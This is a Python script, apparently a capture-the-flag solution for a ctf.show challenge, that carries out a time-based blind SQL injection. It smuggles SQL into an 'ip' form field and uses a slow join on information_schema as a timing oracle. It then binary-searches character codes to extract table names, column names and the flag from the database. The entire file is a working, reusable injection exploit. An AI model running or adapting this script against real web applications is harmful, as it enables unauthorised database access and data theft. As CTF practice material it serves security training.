import time

import requests

url = "http://1e561711-45e0-47b0-852a-03404fffb8e9.challenge.ctf.show/api/"
# 表名 ctfshow_flagxc,ctfshow_info
# payload = "ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}"
# 列名 id,flagaac
# payload = "ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1))>{}"
# flag
payload = "ascii(mid((select flagaabc from ctfshow_flagxccb),{},1))>{}"


def valid_payload(p: str) -> bool:
    data = {
        "debug": 0,
        "ip": f"1) or if({p},(select count(*) from information_schema.columns A,information_schema.tables B"
              f",information_schema.tables C),1 "
    }
    time_s = time.time()
    _ = requests.post(url, data=data)
    time_e = time.time()
    # 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入
    return time_e - time_s > 2


index = 1
result = ""

while True:
    start = 32
    end = 127
    while not (abs(start - end) == 1 or start == end):
        everage = (start + end) // 2
        if valid_payload(payload.format(index, everage)):
            start = everage
        else:
            end = everage
    if end < start:
        end = start
    if chr(end) == "!":
        break
    result += chr(end)
    print(f"[*] result: {result}")
    index += 1
